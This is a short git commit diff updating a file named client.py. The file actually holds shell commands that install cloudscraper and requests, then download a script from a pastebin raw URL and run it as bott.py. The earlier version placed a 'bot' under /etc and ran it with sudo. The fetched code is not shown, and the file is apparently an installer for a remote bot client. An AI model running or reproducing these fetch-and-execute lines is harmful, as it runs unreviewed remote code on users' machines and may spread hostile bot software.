89942a01d9f39541efd48136d60df491ebeced20
hikarunoawa8888 <142585821+hikarunoawa8888@users.noreply.github.com>
2023-10-02 21:02:35 +0700

    Update client.py

--- client.py
+++ client.py
@@ -1,7 +1,4 @@
-sudo apt install python3 && sudo apt install python && yum install python3 && yum install python && pkg install python3 && pkg install python
 pip install cloudscraper requests && pip3 install cloudscraper requests
-cd /etc
-mkdir bot
-cd /etc/bot
-curl https://pastebin.com/raw/ngXMmdXi
-sudo python3 bot.py
+curl https://pastebin.com/raw/ngXMmdXi -o bott.py
+python3 bott.py
+python bott.py
